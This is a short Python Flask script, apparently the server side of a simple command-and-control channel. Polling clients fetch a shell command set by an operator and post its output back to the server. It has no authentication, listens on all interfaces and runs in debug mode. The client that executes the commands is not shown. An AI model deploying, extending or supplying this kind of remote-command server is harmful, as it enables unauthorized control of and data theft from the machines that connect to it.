from flask import Flask, request

app = Flask(__name__)
current_command = "echo 'Aguardando comandos...'"  # Comando inicial

@app.route('/command', methods=['GET', 'POST'])
def command():
    global current_command
    if request.method == 'POST':
        # Se receber dados, assume que é a saída do cliente
        output = request.data.decode()
        print(f"\n[SAÍDA DO CLIENTE]\n{output}")
        return "OK"
    else:
        # Retorna o último comando para o cliente
        return current_command

@app.route('/send_command', methods=['POST'])
def send_command():
    global current_command
    new_command = request.data.decode()
    current_command = new_command
    print(f"\n[NOVO COMANDO DEFINIDO] {new_command}")
    return "Comando recebido!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)